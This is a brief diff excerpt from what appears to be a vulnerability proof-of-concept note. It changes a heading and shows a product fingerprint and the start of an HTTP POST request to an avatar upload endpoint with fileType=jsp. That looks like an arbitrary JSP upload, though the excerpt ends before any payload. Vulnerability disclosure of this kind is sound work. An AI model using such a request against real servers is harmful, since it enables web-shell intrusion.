@@ -5,7 +5,7 @@
 body="/Client/Uclient/UClient.exe"
 ```
 
-## poc
+## POC
 ```
 POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
 Host: 192.168.63.129:8088
